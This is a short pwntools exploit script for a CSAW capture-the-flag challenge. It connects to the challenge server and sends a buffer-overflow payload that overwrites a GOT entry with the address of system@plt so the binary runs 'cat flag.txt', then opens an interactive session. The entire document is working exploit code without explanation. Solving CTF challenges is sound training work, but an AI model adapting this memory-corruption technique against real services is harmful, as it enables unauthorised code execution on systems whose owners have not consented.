from pwn import *

r = remote('pwn.chal.csaw.io', 10105)

p = 'cat flag.txt'.ljust(16) # fill rest of buffer
p += p64(0x4005d0) # address of system@plt
p += p64(0x601008) # address of puts@got - 10, since it gets 10 added to it

r.sendline(p)
r.interactive()
